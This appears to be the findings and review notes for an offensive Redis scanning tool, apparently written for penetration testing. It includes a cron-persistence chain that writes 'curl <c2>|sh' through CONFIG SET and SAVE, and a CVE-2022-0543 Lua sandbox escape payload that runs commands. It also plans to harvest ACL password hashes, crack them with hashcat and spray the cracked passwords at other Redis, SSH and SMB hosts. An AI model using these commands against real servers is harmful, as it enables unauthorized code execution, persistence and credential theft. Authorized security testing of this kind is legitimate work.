summary: Solid RESP + INFO + CONFIG probe with two real T3/T2 promotions already shipped: ACL GETUSER hash harvest and CVE-2022-0543 Lua-sandbox flag verification. Biggest gap: it enumerates write-primitive preconditions (dir/dbfilename/persistence/module_load) inside mongo_unauth text but never emits the RCE primitive as its own probe, and doesn't attempt SLAVEOF module load or the LOADSCRIPT canary. No auth/weak-pw sweep against instances that require AUTH.

findings.tier_evidence: INFO + CONFIG GET actually complete and return keyspace/keys count/config values; enumerates which RCE paths are reachable (module_load, persistence, role=master) but does not invoke them.
findings.promotion_notes: The classic CONFIG SET dir + dbfilename + SAVE chain (SSH authorized_keys / cron / webshell) is a destructive T3 write; keep it opt-in behind a --exploit-ok gate. Non-destructive T3 is publishing every harvested key/hash to the loot pool (partly done via ACL).
findings.tester_next_step:
redis-cli -h <ip> -p <port> --scan | head -50 ; redis-cli -h <ip> -p <port> DUMP <key> ; only in scope: CONFIG SET dir /var/spool/cron/crontabs; CONFIG SET dbfilename root; SET x '

* * * * * curl <c2>|sh

'; SAVE.

findings.title_pattern: Redis Lua sandbox escape (CVE-2022-0543) - unauth RCE
findings.tier_evidence: Runs EVAL 'if package and package.loadlib then return 1 else return 0 end' 0 - a safe reflection probe that positively identifies the vulnerable code path without invoking loadlib.
findings.promotion_notes: T2 = actually load the local liblua .so and execute a harmless PoC (e.g. io.popen('id')) to a canary sink. Currently only the primitive is verified.
findings.tester_next_step: redis-cli -h <ip> -p <port> EVAL 'local f=package.loadlib("/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io"); local io=f(); return io.popen("id"):read("*a")' 0 - only within engagement scope.

findings.title_pattern: Redis ACL user list and password hashes reachable
findings.tier_evidence: ACL USERS + ACL GETUSER read the SHA-256 password hash bytes for every configured user - real credential material for hashcat -m 1400.
findings.promotion_notes: Feed harvested hashes into a shared credential-cracking loop; auto-replay cracked (user,pw) via AUTH against other Redis instances and via password-spray to SSH/SMB.
findings.tester_next_step: echo '<sha256>' | hashcat -m 1400 rockyou.txt --username <user> ; cracked pair -> redis-cli -h <other> AUTH <user> <pw>; also try the same pw at OS.

findings.tier_evidence: INFO server 'redis_version' compared to 6.0 floor; no CVE probe.
findings.promotion_notes: Wire vulndb per-version CVE map (Lua-sandbox 4.x escapes, master-slave sync CVE-2020-14147) as their own kinds with version-only T1 verification.
findings.tester_next_step: redis-cli -h <ip> -p <port> INFO server ; cross-reference redis.io/topics/security advisories.

proposed_shared_surface_consumers: credentials.hash (SHA-256 hashes for m=1400 crack loop)
